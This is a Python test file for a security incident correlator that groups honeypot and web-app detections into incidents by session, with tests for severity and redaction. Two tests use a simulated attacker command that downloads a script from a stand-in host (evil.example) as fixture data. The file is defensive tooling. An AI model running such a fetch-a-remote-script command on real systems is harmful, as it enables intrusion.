from datetime import datetime, timedelta, timezone

import pytest

from src.correlation.correlator import IncidentCorrelator
from src.detection.engine import Detection, DetectionEngine
from src.normalization.normalize import normalize_event

NOW = datetime(2026, 11, 8, 12, 0, tzinfo=timezone.utc)
T0 = datetime(2026, 11, 8, 10, 0, 0, tzinfo=timezone.utc)


def ev(i, kind="cowrie.login.failed", session="s1", seconds=0, source="cowrie", **extra):
    event = {
        "event_id": f"{source}-{session}-{kind}-{i}",
        "source": source,
        "event_type": kind,
        "session_id": session,
        "src_ip": "10.0.0.5",
        "event_timestamp": T0 + timedelta(seconds=seconds),
    }
    event.update(extra)
    return event


def failures(session="s1", count=5, start=0):
    return [ev(i, session=session, seconds=start + i * 10) for i in range(count)]


def run(events, min_severity="medium"):
    detections = DetectionEngine().analyze(events, now=NOW)
    return IncidentCorrelator(min_severity).correlate(detections, events, now=NOW)


def manual_detection(detection_id, event_ids, severity="medium", session="s1"):
    return Detection(detection_id, "R", "desc", severity, tuple(event_ids),
                     {"session_id": session}, NOW)


def test_session_detections_become_one_incident():
    events = failures() + [ev(0, "cowrie.session.connect", seconds=-5)]
    incidents = run(events)
    assert len(incidents) == 1
    incident = incidents[0]
    assert incident.severity == "medium"
    assert incident.status == "open"
    assert incident.session_id == "s1"
    assert len(incident.detection_ids) == 6          # 5 low + 1 brute force
    assert len(incident.timeline) == 6               # 5 échecs + 1 connexion
    assert incident.timeline[0].event_type == "cowrie.session.connect"
    assert incident.event_ids == tuple(e.event_id for e in incident.timeline)


def test_severity_is_the_maximum_of_the_detections():
    events = [ev(i, seconds=i) for i in range(3)] + [ev(0, "cowrie.login.success", seconds=10)]
    incidents = run(events)
    assert len(incidents) == 1
    assert incidents[0].severity == "high"


def test_low_only_detections_create_no_incident():
    assert run([ev(0, seconds=0)]) == []
    assert run([ev(0, seconds=0)], min_severity="low") != []


def test_same_ip_different_sessions_stay_separate():
    events = failures("A") + failures("B")
    incidents = run(events)
    assert len(incidents) == 2
    assert {i.session_id for i in incidents} == {"A", "B"}
    for incident in incidents:
        assert {e.event_id.split("-")[1] for e in incident.timeline} == {incident.session_id}


def test_detections_without_session_create_no_incident():
    events = [
        {"event_id": f"h{i}", "source": "juice_shop", "event_type": "juice_shop.http_request",
         "http_method": "POST", "route": "/rest/user/login", "status_code": 401,
         "src_ip": "10.0.0.7", "event_timestamp": T0 + timedelta(seconds=i)}
        for i in range(10)
    ]
    detections = DetectionEngine().analyze(events, now=NOW)
    assert len(detections) == 10
    assert IncidentCorrelator("low").correlate(detections, events, now=NOW) == []


def test_same_session_id_from_different_sources_stays_separate():
    events = [ev(0, source="cowrie"), ev(0, source="other")]
    detections = [
        manual_detection("d1", [events[0]["event_id"]]),
        manual_detection("d2", [events[1]["event_id"]]),
    ]
    incidents = IncidentCorrelator().correlate(detections, events, now=NOW)
    assert len(incidents) == 2
    assert {i.source for i in incidents} == {"cowrie", "other"}
    assert incidents[0].incident_id != incidents[1].incident_id


def test_incident_id_is_stable_when_evidence_is_added():
    first = run(failures())[0]
    more = failures() + [
        ev(5, seconds=50),
        ev(6, seconds=60),
        ev(0, "cowrie.command.input", seconds=100, command="wget http://evil.example/x.sh"),
    ]
    second = run(more)[0]
    assert first.incident_id == second.incident_id
    assert len(second.detection_ids) > len(first.detection_ids)
    assert len(second.timeline) > len(first.timeline)


def test_result_does_not_depend_on_input_order():
    events = failures() + [ev(0, "cowrie.session.connect", seconds=-5)]
    assert run(events) == run(list(reversed(events)))


def test_detection_with_mismatching_session_is_skipped():
    events = [ev(0, session="OTHER")]
    detection = manual_detection("d1", [events[0]["event_id"]], session="s1")
    assert IncidentCorrelator().correlate([detection], events, now=NOW) == []


def test_detection_citing_only_unknown_events_is_skipped():
    detection = manual_detection("d1", ["ghost"])
    assert IncidentCorrelator().correlate([detection], [], now=NOW) == []


def test_missing_event_ids_are_recorded():
    events = [ev(0)]
    detection = manual_detection("d1", [events[0]["event_id"], "ghost"])
    incident = IncidentCorrelator().correlate([detection], events, now=NOW)[0]
    assert incident.missing_event_ids == ("ghost",)
    assert incident.event_ids == (events[0]["event_id"],)


def test_incident_contains_no_command_text():
    events = [ev(0, "cowrie.command.input", seconds=1,
                 command="wget http://evil.example/x.sh", metadata={"input": "secret-cmd"})]
    incidents = run(events)
    assert len(incidents) == 1
    assert "evil.example" not in str(incidents)
    assert "secret-cmd" not in str(incidents)


def test_invalid_min_severity_is_rejected():
    with pytest.raises(ValueError):
        IncidentCorrelator("urgent")


def test_real_normalizer_pipeline():
    raws = [
        {"eventid": "cowrie.login.failed", "timestamp": f"2026-10-28T10:00:{i:02d}Z",
         "session": "real-1", "src_ip": "10.0.0.9", "username": "root",
         "password": "example-secret"}
        for i in range(5)
    ]
    events = [normalize_event(raw) for raw in raws]
    incidents = run(events)
    assert len(incidents) == 1
    assert incidents[0].session_id == "real-1"
    assert incidents[0].source == "cowrie"
    assert "example-secret" not in str(incidents)